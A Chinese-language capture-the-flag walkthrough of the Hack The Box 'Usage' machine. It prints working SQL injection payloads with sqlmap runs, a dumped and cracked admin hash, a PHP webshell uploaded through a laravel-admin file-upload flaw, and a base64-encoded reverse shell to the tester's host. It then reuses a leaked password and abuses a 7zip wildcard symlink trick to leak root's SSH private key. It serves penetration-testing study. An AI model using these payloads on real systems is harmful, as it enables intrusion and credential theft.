## Usage 

### 500 是 HTTP 状态码，叫 500 Internal Server Error，表示服务器在处理请求时内部出错（代码崩溃、后端异常、资源耗尽等）
#### 其一什么时候改用 Connection: close，服务器在连接复用时表现异常（比如连接复用导致响应错乱、状态混淆或500错误）
#### 其二第一阶段没造成大量 500，可以列出数据库（--dbs）
```
[*]$ nmap -sC -sV 10.129.146.187
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-14 04:46 CDT
Nmap scan report for 10.129.146.187
Host is up (0.011s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a0:f8:fd:d3:04:b8:07:a0:63:dd:37:df:d7:ee:ca:78 (ECDSA)
|_  256 bd:22:f5:28:77:27:fb:65:ba:f6:fd:2f:10:c7:82:8f (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://usage.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

[★]$ echo '10.192.146.187 usage.htb' | sudo tee -a /etc/hosts
10.192.146.187 usage.htb
```
#### 访问网站
![深邃的夜空有看不见的星星](images/091401.png)
#### 点击了Admin,输入了admin/admin:
![深邃的夜空有看不见的星星](images/091402.png)
#### 返回来，点击了Registe注册：
![深邃的夜空有看不见的星星](images/091403.png)
#### 梅开二度，再返回来，点击Reset Password ->输入注册时的邮箱
![深邃的夜空有看不见的星星](images/091404.png)
#### 输对了，还得继续输入邮箱，尝试一个无效的电子邮件显示：
![深邃的夜空有看不见的星星](images/091405.png)
```
test' or 1=1;-- -
```
#### 是典型的 SQL 注入 (SQL Injection) payload 示例。它的含义是：
![深邃的夜空有看不见的星星](images/091406.png)
```
test'：提前闭合了原本的字符串。
or 1=1：构造了一个总是为真的条件。
;-- -：; 结束原来的 SQL 语句，-- - 是 SQL 中的注释符号，把后面的内容全部注释掉。
```
#### 例如，如果后台原来的查询语句是：
```
SELECT * FROM users WHERE username = 'test' AND password = '123';
```
#### 被你输入这个 payload 之后，拼接后会变成：
```
SELECT * FROM users WHERE username = 'test' OR 1=1;-- -' AND password = '123';
```
#### 因为 OR 1=1 永远为真，这样可能导致数据库返回所有用户的信息。
### [1]burpsuite本地拦截
#### 在burpsuite复制的按键Ctrl+C
#### 粘贴到vi里面的按键Shift+Ctrl+V

#### 注册的是test@example.com
#### 拦截的是test@example.com'
#### 手动修改1.在reset.req去掉末尾的%27
#### 手动修改2.什么时候改用 Connection: close，服务器在连接复用时表现异常（比如连接复用导致响应错乱、状态混淆或500错误）
#### 不用Send，send是了看是否500，复制就是了
```
[*]$ vi reset.req

POST /forget-password HTTP/1.1
Host: usage.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://usage.htb/forget-password
Content-Type: application/x-www-form-urlencoded
Content-Length: 75
Origin: http://usage.htb
DNT: 1
Connection: close
Cookie: XSRF-TOKEN=eyJpdiI6IjJNSVpZSTFCd3RuL3A2Y2dxMlBEZFE9PSIsInZhbHVlIjoiT2lkUDdxZHZWQVdBRm1wL0hRUEd2WGZOdjRPeUpWYTd2aXlMTkU4RURhTndMYXRZRnhKeUpjTVJSRUtSeUFkT0ZnNkQ2K2JvY3pUMDhKZGNXWVdBVkNSaGR3S05CdFV1a2tUeWdrVEw5a3RaMEx6U1ZEc0VjS0VLcXVUZ3d6Y1AiLCJtYWMiOiIzYWY4ZTQ1OWM5MDg2YTU3NzkyMmRiZmIyYzhhYmYxMjViMDhlOWU0MjBlMjM4NjFjMmJjYjEwMWRiMTkyMmY2IiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IkN1eEQ4NDdvZFZMVnA5S2VMMFZSSkE9PSIsInZhbHVlIjoiZWZkbVRVNzVQbWFYczJBUzRJSmFrMlJTdlJOdUVsV3pOTVFRd3YxeFpDWmZteXFiOExCU2o1SzZxM2JkMTBXNjVZMEdYYnR1QXhheStMYkFtU3FjamZHL0tjU0l1dkZTUGVnUlJMVWtYV3VTbzZRb2JXMGF5eEpxQXc5OGx6S2giLCJtYWMiOiI1Zjk1YWI2MjkwNGZmM2M3NjcxZDIzMjBhZTA2NjU0OGU2ZTI1NzE0MDI2OTQyNzUwYmJmYmM3OTBjZWM4NjM3IiwidGFnIjoiIn0%3D
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Priority: u=0, i

_token=4fNDZKDZKiQxXE8DGsgGS2kqwIUIGyVrq8mFW5Pt&email=test%40example.com
```
#### sqlmap
```
[★]$ sqlmap -r reset.req -p email --batch

[03:33:22] [WARNING] POST parameter 'email' does not seem to be injectable
[03:33:22] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
[03:33:22] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 25 times, 503 (Service Unavailable) - 5 times
[03:33:22] [WARNING] your sqlmap version is outdated
```
#### 会出现红色的[CRITICAL]
```
[★]$ sqlmap -r reset.req -p email --level 5 --risk 3 --technique=BEUST --batch --dbs --threads 10

[03:40:51] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
[03:40:51] [INFO] checking if the injection point on POST parameter 'email' is a false positive
[03:40:51] [WARNING] false positive or unexploitable injection point detected
[03:40:51] [WARNING] POST parameter 'email' does not seem to be injectable
[03:40:51] [CRITICAL] all tested parameters do not appear to be injectable. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
[03:40:51] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 493 times, 503 (Service Unavailable) - 127 times
[03:40:51] [WARNING] your sqlmap version is outdated
```
### [2]重新再跑一次的步骤 
#### 1.清理
```
[★]$ find ~ | grep sqlmap
/home/syareya55/.local/share/sqlmap
/home/syareya55/.local/share/sqlmap/output
/home/syareya55/.local/share/sqlmap/output/usage.htb
/home/syareya55/.local/share/sqlmap/output/usage.htb/log
/home/syareya55/.local/share/sqlmap/output/usage.htb/target.txt
/home/syareya55/.local/share/sqlmap/history
[★]$ rm -fr /home/syareya55/.local/share/sqlmap
```
#### 2.更新 CSRF token / Cookie 即再burpsuite拦截一次
#### 3.sqlmap (命令来自ChatGPT,使用官方文档和官方视频的命令不成功)
```
[*]$ sqlmap -r reset1.req -p email --batch --level=3 --risk=2 --threads=1 --delay=1 \
      --timeout=15 --retries=2 --drop-set-cookie --flush-session -v 3
//说明：串行、慢速、忽略服务端下发的 cookie，-v 3 看 payload /响应细节

<SNIP>
POST parameter 'email' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
[03:56:52] [DEBUG] used the default behavior, running in batch mode
sqlmap identified the following injection point(s) with a total of 450 HTTP(s) requests:
---
Parameter: email (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: _token=4fNDZKDZKiQxXE8DGsgGS2kqwIUIGyVrq8mFW5Pt&email=test@example.com' AND 4714=(SELECT (CASE WHEN (4714=4714) THEN 4714 ELSE (SELECT 1385 UNION SELECT 2719) END))-- csEK
    Vector: AND [RANDNUM]=(SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))[GENERIC_SQL_COMMENT]

    Type: time-based blind
    Title: MySQL < 5.0.12 AND time-based blind (BENCHMARK)
    Payload: _token=4fNDZKDZKiQxXE8DGsgGS2kqwIUIGyVrq8mFW5Pt&email=test@example.com' AND 3468=BENCHMARK(5000000,MD5(0x79784e4f))-- pCWv
    Vector: AND [RANDNUM]=IF(([INFERENCE]),BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]')),[RANDNUM])
---
[03:56:52] [INFO] the back-end DBMS is MySQL
[03:56:52] [PAYLOAD] test@example.com' AND 3748=(SELECT (CASE WHEN (VERSION() LIKE 0x254d61726961444225) THEN 3748 ELSE (SELECT 5444 UNION SELECT 8871) END))-- -
```
#### sqlmap 已经成功识别出 email 为可注入点（布尔盲注 + 时间盲注），并且后台是 MySQL
#### 第一阶段没造成大量 500，可以列出数据库（--dbs）
```
[★]$ sqlmap -r reset1.req -p email --batch --level=3 --risk=2 --threads=1 --delay=1  --drop-set-cookie --flush-session -v 3 --dbs

<SNIP>
[04:19:31] [INFO] retrieved: usage_blog
[04:19:31] [DEBUG] performed 67 queries in 73.35 seconds
available databases [3]:
[*] information_schema
[*] performance_schema
[*] usage_blog
````
#### 等待的时间大于7分钟
#### 列出 usage_blog 下的表（保守模式）目的：低并发、慢速列出表，减少 500/503。
```
[★]$ sqlmap -r reset1.req -p email --batch --level=3 --risk=2 --threads=10 --drop-set-cookie -D usage_blog --tables
<SNIP>
Database: usage_blog
[15 tables]
+------------------------+
| aaaaa_iala?us?rs       |
| admin_user[oeqmiqqia?s |
| admin_menu             |
| admin_operation_log    |
| admin_permissions      |
| admin_role_menu        |
| admin_role_permissions |
| admin_roles            |
| admin_users            |
| blog                   |
| failed_jobs            |
| migrations             |
| password_reset_tokens  |
| personal_access_tokens |
| users                  |
+------------------------+
<SNIP>
```
#### 这个命令很快
### [3]再重新再跑一次的步骤 
#### 1.清理
#### 2.更新 CSRF token / Cookie 即再burpsuite拦截一次
```
[★]$ sqlmap -r reset2.req -p email --batch --level=3 --risk=2  --drop-set-cookie -D usage_blog -T admin_users --dump

[11:36:54] [INFO] retrieved: admin
Database: usage_blog
Table: admin_users
[1 entry]
+----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
| id | name          | avatar  | password                                                     | username | created_at          | updated_at          | remember_token                                               |
+----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
| 1  | Administrator | <blank> | $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2 | admin    | 2023-08-13 02:48:26 | 2023-08-23 06:02:19 | kThXIKu7GhLpgwStz7fCFxjDomCYS1SmPpxwEkzv1Sdzva0qLYaDhllwrsLT |
+----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
```
#### 我们获得Administrator用户的哈希值，将其保存到一个名为hash的文件中，并将其提供给哈希破解工具john：
```
[★]$ vi hash
[★]$ cp /usr/share/wordlists/rockyou.txt.gz .
[★]$ gunzip rockyou.txt.gz
[★]$ john hash --wordlist=rockyou.txt
Created directory: /home/syareya55/.john
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
whatever1        (?)     
1g 0:00:00:09 DONE (2025-09-17 11:47) 0.1103g/s 178.8p/s 178.8c/s 178.8C/s alexis1..serena
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
#### 密码为whatever1 
### 访问admin.usage.htb,用户/密码：admin/whatever1

#### 在仪表板的Environment部分，我们看到正在使用Laravel 10.18.0和PHP 8.1.2。在在撰写本文时，这两个版本都没有公开的重大漏洞。然而，在Dependencies选项卡的右边，我们看到一些库和包在使用。值得注意的是，该网站使用了encore/laravel-admin 1.8.18，这似乎很容易受到攻击。
![918空鸣918台风918忌日](images/091807.png)
https://nvd.nist.gov/vuln/detail/CVE-2023-24249
#### laravel-admin v1.8.19 中的任意文件上传漏洞允许攻击者通过精心设计的 PHP 文件执行任意代码。
https://flyd.uk/post/cve-2023-24249/
#### larravel-admin存在问题，允许攻击者绕过文件上传限制，攻击者可以上传*.php格式的文件进行远程代码执行
https://github.com/IDUZZEL/CVE-2023-24249-Exploit
#### 为了学习，我们将手动利用这个向量
```
攻击的工作流程如下：
1. 上传一个PHP webshell为.jpg文件。
2. 拦截请求并将扩展名设置为.jpg.php。
3. 直接访问上传的文件，执行PHP webshell。
```
#### 首先，我们通过点击右上角的用户图标下拉导航菜单：
![918空鸣918台风918忌日](images/091808.png)
#### 接下来，我们按下设置按钮，重定向到/admin/auth/Setting
#### 在这里，我们可以上传一个新的头像图像。我们在机器上创建一个简单的php.shell
```
[★]$ echo '<?php system($_GET["melo"]); ?>' > shell.php
[★]$ mv shell.php shell.jpg
```
![918空鸣918台风918忌日](images/091809.png)
#### 在按下Submit之前，我们打开BurpSuite代理来拦截上传请求。点击Submit，直接联网
![918空鸣918台风918忌日](images/091810.png)
#### 直接在raws上修改,只在shell.jpg后面加上.php；Forword；浏览器就有了：
![918空鸣918台风918忌日](images/091811.png)
#### 一旦我们转发请求，图像上传成功，我们可以复制链接到它所在的位置存储
#### 需要在新的连接输入：http ://admin.usage.htb/uploads/images/shell.jpg.shell?melo=id
![必须像正常一样生活](images/0920012.png)
https://www.revshells.com/
#### 给了个好用的工具
![必须像正常一样生活](images/0920013.png)
### 像刚刚一样插入payload，访问浏览器：(空格使用%20)
```
http://admin.usage.htb/uploads/images/shell.jpg.php?melo=echo%20c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTQ5LzQ0NDQgMD4mMQ==%20%7C%20base64%20-d%20%7C%20bash
```
```
[★]$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.149] from (UNKNOWN) [10.129.178.97] 49940
sh: 0: can't access tty; job control turned off
$ script /dev/null -c bash
Script started, output log file is '/dev/null'.

dash@usage:/var/www/html/project_admin/public/uploads/images$ cat /home/dash/user.txt
<dmin/public/uploads/images$ cat /home/dash/user.txt

dash@usage:/var/www/html/project_admin/public/uploads/images$ cat /etc/passwd | grep /bin/bash
<ic/uploads/images$ cat /etc/passwd | grep /bin/bash          
root:x:0:0:root:/root:/bin/bash
dash:x:1000:1000:dash:/home/dash:/bin/bash
xander:x:1001:1001::/home/xander:/bin/bash
```
```
dash@usage:/var/www/html/project_admin/public/uploads/images$ ss -tlpn
ss -tlpn
State  Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess                                                 
LISTEN 0      70         127.0.0.1:33060      0.0.0.0:*                                                           
LISTEN 0      511          0.0.0.0:80         0.0.0.0:*    users:(("nginx",pid=1223,fd=6),("nginx",pid=1222,fd=6))
LISTEN 0      128          0.0.0.0:22         0.0.0.0:*                                                           
LISTEN 0      4096   127.0.0.53%lo:53         0.0.0.0:*                                                           
LISTEN 0      1024       127.0.0.1:2812       0.0.0.0:*    users:(("monit",pid=1818,fd=5))                        
LISTEN 0      151        127.0.0.1:3306       0.0.0.0:*                                                           
LISTEN 0      128             [::]:22            [::]:*
```
#### 默认情况下，端口3306和33060属于MySQL，我们已经枚举了。端口2812，然而，看起来很有趣，因为它不属于开放端口的典型分类。我们看到port属于进程监视器，进程ID为33663。对我们来说不幸的是，进程窥探似乎在机器上受到限制，因为我们只能看到进程属于我们的用户：
```
dash@usage:/var/www/html/project_admin/public/uploads/images$ ps aux
ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
dash        1222  0.0  0.1  66484  6992 ?        S    16:06   0:00 nginx: worker
dash        1223  0.0  0.1  66220  5636 ?        S    16:06   0:00 nginx: worker
dash        1782  0.0  0.0   2892   956 ?        S    16:34   0:00 sh -c echo c2
dash        1785  0.0  0.0   4364  3252 ?        S    16:34   0:00 bash
dash        1786  0.0  0.0   2892   976 ?        S    16:34   0:00 sh -i
dash        1787  0.0  0.0   2808  1100 ?        S    16:35   0:00 script /dev/n
dash        1788  0.0  0.0   2892   960 pts/0    Ss   16:35   0:00 sh -c bash
dash        1789  0.0  0.1   5684  4692 pts/0    S    16:35   0:00 bash
dash        1818  0.0  0.0  84684  3432 ?        Sl   16:37   0:00 /usr/bin/moni
dash        1826  0.0  0.0   7064  1572 pts/0    R+   16:38   0:00 ps aux
```
#### fstab文件也显示了同样多的信息，因为/proc是在将hidepid选项设置为2的情况下挂载的隐藏其他用户的进程：
```
dash@usage:/var/www/html/project_admin/public/uploads/images$ cat /etc/fstab
cat /etc/fstab
<SNIP>
proc /proc proc defaults,hidepid=2 0 0
<SNIP>
```
#### /etc/fstab文件：该文件用于定义如何将磁盘分区、其他各种块设备或远程文件系统应该被挂载并集成到文件系统中。proc文件系统：proc文件系统是一个伪文件系统，它提供了一个内核接口数据结构。它通常挂载在/proc。
#### 挂载选项:
#### 1.defaults：使用默认的挂载选项，包括rw、suid、dev、exec、auto、nouser和异步。
#### 2.hidpid =2：该选项隐藏其他用户的进程。当hiddepid =2时，用户看不到任何其他用户的进程及其/proc/[pid]目录。这通过限制来提高安全性其他用户进程的可见性，并降低进程窥探的风险。通过使用hidepid=2选项，系统管理员增加了系统的安全性使用户难以查看他们不拥有的流程并与之交互。这是在多用户环境或运行敏感信息的系统中特别有用需要保护进程不受未授权用户的影响。
#### 接下来，我们看看是否能找到一个属于monit服务的服务文件：
```
dash@usage:~$ find / -name monit.service 2>/dev/null
find / -name monit.service 2>/dev/null
/sys/fs/cgroup/system.slice/monit.service
/usr/share/doc/monit/examples/monit.service
/etc/systemd/system/monit.service
/etc/systemd/system/multi-user.target.wants/monit.service
```
#### 我们是成功的，所以我们检查服务文件是如何定义的。
```
dash@usage:~$ cat /etc/systemd/system//monit.service
cat /etc/systemd/system//monit.service
[Unit]
Description=Monitoring Service
After=network.target

[Service]
Type=simple
Restart=always
RestartSec=2
User=dash
Group=dash
ExecStart=/usr/bin/monit

[Install]
WantedBy=multi-user.target
```
#### 通过研究该服务，我们发现monit是一个用于管理和监视Unix系统的实用程序。它还进行自动维护和修理，并可配置为在错误情况下执行操作；使它成为一个有趣的候选对象。
#### 在我们看到监视器正在运行的服务文件dash，这就解释了为什么我们知道它的PID，尽管机器上的进程窥探被禁用了。这使开发变得不那么有趣；尽管如此，我们将仔细查看它的配置，看看是否我们可以学到一些东西。在用户的主目录中，我们找到监控文件，即。monitrc:
https://mmonit.com/monit/
```
dash@usage:~$ ls -al ~
ls -al ~
total 52
drwxr-x--- 6 dash dash 4096 Sep 20 16:48 .
drwxr-xr-x 4 root root 4096 Aug 16  2023 ..
lrwxrwxrwx 1 root root    9 Apr  2  2024 .bash_history -> /dev/null
-rw-r--r-- 1 dash dash 3771 Jan  6  2022 .bashrc
drwx------ 3 dash dash 4096 Aug  7  2023 .cache
drwxrwxr-x 4 dash dash 4096 Aug 20  2023 .config
drwxrwxr-x 3 dash dash 4096 Aug  7  2023 .local
-rw-r--r-- 1 dash dash   32 Oct 26  2023 .monit.id
-rw-r--r-- 1 dash dash    5 Sep 20 16:48 .monit.pid
-rw------- 1 dash dash 1192 Sep 20 16:48 .monit.state
-rwx------ 1 dash dash  707 Oct 26  2023 .monitrc
-rw-r--r-- 1 dash dash  807 Jan  6  2022 .profile
drwx------ 2 dash dash 4096 Aug 24  2023 .ssh
-rw-r----- 1 root dash   33 Sep 20 16:07 user.txt
```
#### 在其中，我们找到了admin用户的明文密码：
```
dash@usage:~$ cat ~/.monitrc
cat ~/.monitrc
#Monitoring Interval in Seconds
set daemon  60

#Enable Web Access
set httpd port 2812
     use address 127.0.0.1
     allow admin:3nc0d3d_pa$$w0rd

#Apache
check process apache with pidfile "/var/run/apache2/apache2.pid"
    if cpu > 80% for 2 cycles then alert


#System Monitoring 
check system usage
    if memory usage > 80% for 2 cycles then alert
    if cpu usage (user) > 70% for 2 cycles then alert
        if cpu usage (system) > 30% then alert
    if cpu usage (wait) > 20% then alert
    if loadavg (1min) > 6 for 2 cycles then alert 
    if loadavg (5min) > 4 for 2 cycles then alert
    if swap usage > 5% then alert

check filesystem rootfs with path /
       if space usage > 80% then alert
```
#### 3nc0d3d_pa$$w0rd
#### 每当我们发现一个密码时，我们应该看看它是否在其他地方被重复使用。我们看到除了对于root用户，存在另一个低权限帐户xander。
```
dash@usage:~$ ls -al /home
ls -al /home
total 16
drwxr-xr-x  4 root   root   4096 Aug 16  2023 .
drwxr-xr-x 19 root   root   4096 Apr  2  2024 ..
drwxr-x---  6 dash   dash   4096 Sep 20 16:51 dash
drwxr-x---  4 xander xander 4096 Apr  2  2024 xander
```
#### 我们使用su尝试使用发现的密码3nc0d3d_pa$$w0rd验证xander：
```
dash@usage:~$ su xander
su xander
Password: 3nc0d3d_pa$$w0rd

xander@usage:/home/dash$ id 
id 
uid=1001(xander) gid=1001(xander) groups=1001(xander)
```
#### 我们的尝试成功了，我们现在可以进入桑德的账户了。我们关闭逆壳层通过SSH进行身份验证以获得更稳定的shell。
```
[★]$ ssh xander@usage.htb

xander@usage:~$ sudo -l
Matching Defaults entries for xander on usage:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User xander may run the following commands on usage:
    (ALL : ALL) NOPASSWD: /usr/bin/usage_management
```
#### 我们可以看到，我们可以作为根用户执行usage_management二进制文件。有问题的文件似乎是自定义可执行:
```
xander@usage:~$ file /usr/bin/usage_management
/usr/bin/usage_management: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=fdb8c912d98c85eb5970211443440a15d910ce7f, for GNU/Linux 3.2.0, not stripped
```
### Dynamic Analysis 动态分析
#### 我们通过简单地运行二进制文件来查看我们能做些什么：
```
xander@usage:~$ sudo /usr/bin/usage_management
Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
```
#### 我们可以选择备份项目、MySQL数据库或重置管理员的密码。选项一似乎运行7zip命令在/var/backups目录下创建一个备份
```
Enter your choice (1/2/3): 1

7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs AMD EPYC 7763 64-Core Processor                 (A00F11),ASM,AES-NI)

Scanning the drive:
2984 folders, 17973 files, 114778869 bytes (110 MiB)

Creating archive: /var/backups/project.zip

Items to compress: 20957

                                                                               
Files read from disk: 17973
Archive size: 54871802 bytes (53 MiB)
Everything is Ok
```
#### 选项二运行时不产生任何输出，但我们确实看到了一个mysql_backup。中创建的SQL文件与项目备份相同的目录：
```
xander@usage:~$ ls -al /var/backups/
<SNIP>
-rw-r--r--  1 root root  1337117 Sep 20 17:07 mysql_backup.sql
-rw-r--r--  1 root root 54871802 Sep 20 17:08 project.zip
```
#### 最后，选项3只说明密码已重置：
```
xander@usage:~$ sudo /usr/bin/usage_management
Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
Enter your choice (1/2/3): 3
Password has been reset.
```
### Static Analysis 静态分析
#### 要初步掌握二进制文件的行为，一种直接而有效的方法是在其上运行字符串。这有时会泄露硬编码密码或其他重要信息。
```
xander@usage:~$ strings /usr/bin/usage_management
/lib64/ld-linux-x86-64.so.2
chdir
<SNIP>
/var/www/html
/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *
Error changing working directory to /var/www/html
/usr/bin/mysqldump -A > /var/backups/mysql_backup.sql
Password has been reset.
Choose an option:
<SNIP>
```
#### 在这种情况下，我们看到的命令提供了对工具行为的洞察。首先，MySQL备份似乎是使用mysqldump执行的，这是一种常见的做法，并且在这里实现得很好。
/usr/bin/mysqldump -A > /var/backups/mysql_backup.sql
#### 接下来，我们看到通过7zip触发项目备份的命令：
/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *
```
A 表示追加模式，将文件添加到指定的归档文件（/var/backup /project.zip）中。
-tzip 指定目标归档文件的文件类型，即ZIP
-snl 将符号链接存储为链接（而不是它们指向的文件）
-mmt 启用多线程以实现更快的压缩
—-* 包含当前目录下的所有文件和目录
```
#### 该命令遵循chdir命令，该命令尝试将当前工作目录（CWD）设置为 /var/www/html。
#### snl标志指向符号链接，这是一种常见的错误配置转向攻击向量。根据根据HackTricks的一篇文章，如果我们得到许可，7zip可以被滥用，在存档中包含任意文件将符号链接写入源目标。在本例中，源文件是/var/www/html。
https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/wildcards-spare-tricks.html#id-7z
```
xander@usage:~$ ls -ld  /var/www/html/
drwxrwxrwx 4 root xander 4096 Apr  3  2024 /var/www/html/
```
#### 由于我们对目录具有RWX权限，因此可以利用usage_management工具读取任意文件，如根用户的私有SSH密钥
### Steps to Exploit 利用步骤
#### 在本地端口执行2条命令
```
[★]$ vi passwords
3nc0d3d_pa$$w0rd
[★]$ 7z a backup.zip @passwords

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,128 CPUs AMD EPYC 7543 32-Core Processor                 (A00F11),ASM,AES-NI)

Scanning the drive:
          
WARNING: No more files
3nc0d3d_pa$$w0rd

0 files, 0 bytes

Creating archive: backup.zip

Items to compress: 0

    
Files read from disk: 0
Archive size: 22 bytes (1 KiB)

Scan WARNINGS for files and folders:

3nc0d3d_pa$$w0rd : No more files
----------------
Scan WARNINGS: 1
```
#### 在ssh端口执行
```
xander@usage:~$ touch -- @root.txt
xander@usage:~$ touch -- @id_rsa
xander@usage:~$ ln -s /root/root.txt root.txt
xander@usage:~$ ln -s /root/.ssh/id_rsa id_rsa
xander@usage:~$ ls
@id_rsa  id_rsa  project_admin  @root.txt  root.txt  usage_blog
xander@usage:~$ mv * /var/www/html/

xander@usage:~$ cd /var/www/html/
xander@usage:/var/www/html$ ls
@id_rsa  id_rsa  project_admin  @root.txt  root.txt  usage_blog
```
```
xander@usage:/var/www/html$ sudo -l
```
#### 下面已经拿到root.txt了
```
xander@usage:/var/www/html$ sudo /usr/bin/usage_management
Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
Enter your choice (1/2/3): 1
<SNIP>
WARNING: No more files
528b5b5aa283451e7548c5a09bcd0917
<SNIP>
Scan WARNINGS for files and folders:

-----BEGIN OPENSSH PRIVATE KEY----- : No more files
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW : No more files
QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi : No more files
QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q : No more files
AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs : No more files
H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM= : No more files
-----END OPENSSH PRIVATE KEY----- : No more files
528b5b5aa283451e7548c5a09bcd0917 : No more files
----------------
Scan WARNINGS: 8
```
### D 删除光标后的字符
```
[★]$ vi root
[★]$ cat root
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi
QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q
AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs
H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM=
-----END OPENSSH PRIVATE KEY-----

[★]$ chmod 600 root
[★]$ ssh -i root root@10.129.178.97
cleanup.sh  root.txt  snap  usage_management.c
```


### 官方后记
#### 为什么@id_rsa启用漏洞
#### @id_rsa的存在欺骗7zip将id_rsa视为要压缩的文件列表。因为id_rsa是symlink到根的SSH密钥，7zip读取SSH密钥文件的内容，导致内容为包含在输出中。
#### -snl标志的作用
#### 用于创建存档的完整7z命令如下：
/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *
#### snl标志的定义如下：
-snl : store symbolic links as links
#### 虽然有人可能会认为这将打破我们刚刚滥用的向量，但这个标志并不能阻止这种利用。相反，它确保符号链接本身存储在存档中，而不是它所指向的文件中。然而,当7zip读取id_rsa符号链接作为文件列表时，它仍然遵循符号链接读取目标文件的符号链接内容，该内容允许该漏洞工作。
/dev/shm

